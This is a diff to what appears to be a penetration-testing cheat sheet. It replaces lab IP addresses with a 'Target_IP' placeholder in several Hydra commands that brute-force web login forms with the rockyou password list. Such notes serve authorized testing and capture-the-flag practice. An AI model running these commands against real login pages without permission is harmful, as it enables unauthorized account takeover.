@@ -2,15 +2,15 @@
 
 ## HTTP Post Web Form
 
-$ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "Login Page:<Request Body:Error Message"
+$ hydra -l user -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "Login Page:Request Body:Error Message"
 
 $ hydra -l admin -P /dir/passwd-list.txt http://example.com  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 
-$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.12.183 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+$ hydra -l molly -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 
-$hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.4.149 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
+$hydra -l admin -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
 
-$ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
+$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
 
 ## FTP
 
